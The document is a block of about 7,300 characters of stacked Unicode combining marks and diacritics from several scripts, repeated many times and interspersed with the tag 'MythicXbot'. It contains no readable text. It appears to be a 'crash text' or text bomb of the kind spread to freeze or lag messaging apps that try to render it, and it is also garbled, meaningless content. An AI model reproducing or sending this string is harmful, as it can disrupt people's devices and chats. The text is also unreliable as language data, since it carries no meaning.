๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭৭৭৭৭৭*MythicXbot*๒๒๒๒๒๒๒๒*MythicXbot*৭৭৭৭৭৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴